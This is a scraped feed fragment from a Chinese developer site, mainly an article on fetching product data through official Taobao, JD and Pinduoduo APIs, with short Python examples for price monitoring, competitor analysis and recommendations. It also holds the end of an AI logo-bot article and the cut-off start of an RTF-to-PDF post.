<p>通过本文，我们不仅 <strong>完整还原了 <code>readme.md</code> 和 <code>index.html</code> 中的所有知识点</strong>，还深入扩展了每个环节的技术细节与最佳实践。从一个简单的“生成图标”需求出发，我们构建了一个融合现代 Web 开发、AI 能力与无障碍设计的完整应用。</p>
<p>现在，你可以自信地说：<strong>“我能用 DALL·E 3 做一个 Logo 生成 Bot！”</strong> 💪</p>
<p>快去动手实现吧！别忘了给你的项目起个酷炫的名字～ 🚀✨</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[解锁淘宝京东拼多多API，让电商数据为你所用]]></title>    <link>https://juejin.cn/post/7576994308273471507</link>    <guid>https://juejin.cn/post/7576994308273471507</guid>    <pubDate>2025-11-27T06:13:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576994308273471507" data-draft-id="7577171133444145188" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="解锁淘宝京东拼多多API，让电商数据为你所用"/> <meta itemprop="keywords" content="API"/> <meta itemprop="datePublished" content="2025-11-27T06:13:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="电商api2467742810"/> <meta itemprop="url" content="https://juejin.cn/user/2147781265591291"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            解锁淘宝京东拼多多API，让电商数据为你所用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2147781265591291/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    电商api2467742810
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:13:23.000Z" title="Thu Nov 27 2025 06:13:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<p>在数字化时代，电商平台已成为商业活动的重要阵地。淘宝、京东、拼多多三大巨头汇聚了海量商品信息和消费者行为数据。若能有效获取并利用这些数据，企业将获得市场竞争的关键优势。本文将探讨如何通过官方API合法获取电商数据，并将其转化为商业价值。</p>
<h4 data-id="heading-0">一、电商数据的价值洼地</h4>
<p>电商平台每日产生：</p>
<ul>
<li>千万级商品更新数据</li>
<li>亿级用户行为轨迹</li>
<li>实时价格波动信息 这些数据蕴含消费者偏好、市场趋势、竞品策略等关键商业情报。传统爬虫方式面临法律风险和技术壁垒，而官方API提供了合规的数据获取通道。</li>
</ul>
<h4 data-id="heading-1">二、API接入实战</h4>
<p>以淘宝API为例，获取商品数据的基本流程如下：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function">import requests

def <span class="hljs-title">fetch_taobao_item</span>(<span class="hljs-params">item_id</span>):
    # 认证信息配置
    app_key</span> = <span class="hljs-string">'YOUR_APP_KEY'</span>
    app_secret = <span class="hljs-string">'YOUR_APP_SECRET'</span>
    url = <span class="hljs-string">'https://api.taobao.com/router/rest'</span>
    
    <span class="hljs-meta"># 构造请求参数</span>
    <span class="hljs-keyword">params</span> = {
        <span class="hljs-string">'method'</span>: <span class="hljs-string">'taobao.item.get'</span>,
        <span class="hljs-string">'item_id'</span>: item_id,
        <span class="hljs-string">'format'</span>: <span class="hljs-string">'json'</span>,
        <span class="hljs-string">'v'</span>: <span class="hljs-string">'2.0'</span>,
        <span class="hljs-string">'sign_method'</span>: <span class="hljs-string">'md5'</span>,
        <span class="hljs-string">'app_key'</span>: app_key,
        <span class="hljs-string">'timestamp'</span>: str(<span class="hljs-built_in">int</span>(time.time()))
    }
    
    <span class="hljs-meta"># 生成签名</span>
    <span class="hljs-keyword">params</span>[<span class="hljs-string">'sign'</span>] = generate_sign(<span class="hljs-keyword">params</span>, app_secret)
    
    <span class="hljs-meta"># 发送请求</span>
    response = requests.<span class="hljs-keyword">get</span>(url, <span class="hljs-keyword">params</span>=<span class="hljs-keyword">params</span>)
    <span class="hljs-keyword">return</span> response.json()
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-2">三、数据应用场景</h4>
<ol>
<li>
<p><strong>价格监控系统</strong></p>
<pre><code class="hljs language-ini" lang="ini">def monitor_price(item_id):
    while True:
        <span class="hljs-attr">data</span> = fetch_taobao_item(item_id)
        <span class="hljs-attr">current_price</span> = data[<span class="hljs-string">'price'</span>]
        if current_price &lt; threshold_price:
            send_alert_notification()
        time.sleep(3600)  <span class="hljs-comment"># 每小时检测一次</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
</li>
<li>
<p><strong>竞品分析矩阵</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">def competitor_analysis(competitor_ids):
    result = {}
    <span class="hljs-keyword">for</span> cid <span class="hljs-keyword">in</span> competitor_ids:
        <span class="hljs-keyword">data</span> = fetch_taobao_item(cid)
        result[cid] = {
            <span class="hljs-string">'sales'</span>: <span class="hljs-keyword">data</span>[<span class="hljs-string">'sales'</span>],
            <span class="hljs-string">'rating'</span>: <span class="hljs-keyword">data</span>[<span class="hljs-string">'rating'</span>],
            <span class="hljs-string">'promotions'</span>: <span class="hljs-keyword">data</span>[<span class="hljs-string">'promotion_info'</span>]
        }
    <span class="hljs-keyword">return</span> result
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
</li>
<li>
<p><strong>用户画像构建</strong></p>
<pre><code class="hljs language-scss" lang="scss">def <span class="hljs-built_in">build_user_profile</span>(user_behavior_data):
    # 使用协同过滤算法
    user_matrix = <span class="hljs-built_in">create_user_item_matrix</span>(user_behavior_data)
    model = <span class="hljs-built_in">AlternatingLeastSquares</span>(factors=<span class="hljs-number">50</span>)
    model.<span class="hljs-built_in">fit</span>(user_matrix)
    return model.<span class="hljs-built_in">recommend</span>(user_id)
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
</li>
</ol>
<h4 data-id="heading-3">四、安全合规要点</h4>
<ol>
<li>
<p>严格遵循平台API调用频率限制： <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>最大请求数</mtext><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>5000</mn><mi mathvariant="normal">/</mi><mtext>天</mtext></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>普通应用 </mtext><mn>10000</mn><mi mathvariant="normal">/</mi><mtext>天</mtext></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>企业认证</mtext></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">\text{最大请求数} = \begin{cases} 5000/\text{天} &amp; \text{普通应用} \ 10000/\text{天} &amp; \text{企业认证} \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord text"><span class="mord cjk_fallback">最大请求数</span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.8em;vertical-align:-0.65em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.97em;"><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"/><span class="mord"><span class="mord">5000/</span><span class="mord text"><span class="mord cjk_fallback">天</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.47em;"><span/></span></span></span></span><span class="arraycolsep" style="width:1em;"/><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.97em;"><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"/><span class="mord"><span class="mord text"><span class="mord cjk_fallback">普通应用</span></span><span class="mspace"> </span><span class="mord">10000/</span><span class="mord text"><span class="mord cjk_fallback">天</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.47em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.97em;"><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"/><span class="mord"><span class="mord text"><span class="mord cjk_fallback">企业认证</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.47em;"><span/></span></span></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></p>
</li>
<li>
<p>敏感数据处理原则：</p>
<ul>
<li>用户隐私数据必须脱敏处理</li>
<li>不得存储原始支付信息</li>
<li>遵守GDPR等数据保护法规</li>
</ul>
</li>
<li>
<p>缓存策略优化：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">from redis <span class="hljs-keyword">import</span> Redis
cache = Redis()

def get_cached_data(key, ttl=<span class="hljs-number">300</span>):
    <span class="hljs-keyword">if</span> cache.exists(key):
        <span class="hljs-keyword">return</span> cache.<span class="hljs-keyword">get</span>(key)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">data</span> = fetch_api_data()
        cache.setex(key, ttl, <span class="hljs-keyword">data</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">data</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
</li>
</ol>
<h4 data-id="heading-4">五、数据价值升华</h4>
<p>通过API获取的原始数据需经深度加工：</p>
<ol>
<li>
<p>建立时间序列模型预测价格波动： <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><mi>α</mi><msub><mi>P</mi><mi>t</mi></msub><mo>+</mo><mi>β</mi><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>γ</mi><mi>i</mi></msub><msub><mi>S</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P_{t+1} = \alpha P_t + \beta \sum_{i=1}^{n} \gamma_i S_{i,t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.104em;vertical-align:-0.2997em;"/><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> 其中<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span>为价格，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span>为影响因素</p>
</li>
<li>
<p>构建商品知识图谱：</p>
<pre><code class="hljs language-css" lang="css">graph LR
<span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[手机]</span> --&gt; <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[品牌]</span>
<span class="hljs-selector-tag">A</span> --&gt; C<span class="hljs-selector-attr">[价格区间]</span>
<span class="hljs-selector-tag">A</span> --&gt; D<span class="hljs-selector-attr">[功能特性]</span>
<span class="hljs-selector-tag">B</span> --&gt; E<span class="hljs-selector-attr">[苹果]</span>
<span class="hljs-selector-tag">B</span> --&gt; F<span class="hljs-selector-attr">[华为]</span>
D --&gt; G<span class="hljs-selector-attr">[5G]</span>
D --&gt; H<span class="hljs-selector-attr">[摄像头]</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
</li>
<li>
<p>开发智能决策系统：</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EcommerceDecisionSystem</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, api_client</span>):
        <span class="hljs-variable language_">self</span>.data_source = api_client
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">make_pricing_decision</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, product_id</span>):
        market_data = <span class="hljs-variable language_">self</span>.data_source.get_market_trends()
        cost_data = <span class="hljs-variable language_">self</span>.data_source.get_supply_chain_info()
        <span class="hljs-keyword">return</span> optimize_price(product_id, market_data, cost_data)
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
</li>
</ol>
<h4 data-id="heading-5">结语</h4>
<p>电商API如同数字世界的石油钻井平台，只有掌握正确的开采技术，才能让数据能源源源不断转化为商业动力。通过本文介绍的技术路径，企业可建立合规高效的数据获取体系，将淘宝、京东、拼多多的数据金矿转化为：</p>
<ul>
<li>实时市场感知能力</li>
<li>精准用户洞察能力</li>
<li>敏捷商业决策能力 在数据驱动的商业新时代，掌握API技术就是掌握市场竞争的制高点。</li>
</ul>
<p><strong>注</strong>：本文示例代码需配合各平台官方SDK使用，实际开发请参考最新API文档。数据获取应严格遵守《网络安全法》及相关平台协议。</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何使用 C# 将 RTF 转换为 PDF]]></title>    <link>https://juejin.cn/post/7576968345875218459</link>    <guid>https://juejin.cn/post/7576968345875218459</guid>    <pubDate>2025-11-27T06:15:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576968345875218459" data-draft-id="7576918517238693938" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何使用 C# 将 RTF 转换为 PDF"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-27T06:15:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LSTM97"/> <meta itemprop="url" content="https://juejin.cn/user/2253353867033484"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何使用 C# 将 RTF 转换为 PDF
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2253353867033484/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LSTM97
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:15:26.000Z" title="Thu Nov 27 2025 06:15:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 